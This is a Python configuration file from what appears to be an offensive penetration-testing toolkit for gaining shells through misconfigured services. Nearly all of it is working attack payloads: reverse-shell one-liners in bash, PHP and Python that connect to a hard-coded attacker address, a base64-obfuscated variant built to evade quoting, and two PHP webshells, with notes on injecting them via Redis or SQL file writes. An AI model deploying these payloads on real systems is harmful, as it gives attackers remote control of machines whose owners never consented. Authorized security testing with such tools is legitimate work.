"""Shared config for the service-foothold module: get a shell via a service's anonymous/default/misconfig
access (no cracked cred, no CVE, no web app needed). Sister to ../network/ (creds/CVE) and ../web/ (web).
Generators PRINT commands (attacker box); the shell/loot feeds the privesc kits + report/. Authorized only.
"""
import base64
LHOST, LPORT = "10.10.14.7", 443

def revshell_nq():
    """quote-FREE revshell (base64) for embedding inside single/double-quoted commands — no collisions."""
    inner = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
    return "echo " + base64.b64encode(f"bash -c '{inner}'".encode()).decode() + "|base64 -d|bash"

def revshell(lang="bash"):
    L, P = LHOST, LPORT
    return {
        "bash":   f"bash -c 'bash -i >& /dev/tcp/{L}/{P} 0>&1'",
        "php":    f"php -r '$s=fsockopen(\"{L}\",{P});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "python": f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{L}\",{P}));"
                  f"[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",
    }.get(lang, f"bash -c 'bash -i >& /dev/tcp/{L}/{P} 0>&1'")

WEBSHELL_PHP = "<?php system($_REQUEST['c']); ?>"          # standalone drop (a file you write directly); trigger ?c=<cmd>
# QUOTE-FREE webshell — MUST be used whenever the body is embedded inside a single-quoted shell arg
# (echo '...', redis-cli set x '...') or a single-quoted SQL string (SELECT '...' INTO OUTFILE). The
# quoted form above would have its inner 'c' close the outer quote, leaving a bareword => PHP 8 fatal.
# Numeric index needs no quotes at all. Trigger with  ?0=<cmd>  (e.g. s.php?0=id).
WEBSHELL_PHP_NQ = "<?php system($_GET[0]);?>"
